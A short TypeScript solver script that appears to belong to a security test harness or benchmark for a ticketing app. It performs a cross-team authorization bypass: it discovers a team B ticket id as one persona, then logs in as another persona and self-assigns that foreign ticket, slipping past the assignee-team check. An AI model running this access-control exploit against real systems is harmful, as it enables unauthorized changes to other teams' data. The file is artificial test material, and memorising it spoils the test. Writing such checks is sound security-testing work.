// Cross-team write via ticket assignment: discover a team B ticket id as persona_b, then as persona_a
// self-assign that foreign ticket (the assignee is the acting user, so the assignee-team gate passes).
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const listRes = await ctx.fetch(ctx.plan.routes.ticketList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ ext_id: string }> }
  const victimId = list.items?.[0]?.ext_id
  if (!victimId) return

  await ctx.login('persona_a')
  const path = ctx.plan.routes.ticketAssign!.path.replace(/:[A-Za-z0-9_]+/, victimId)
  await ctx.fetch(path, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({}),
  })
}
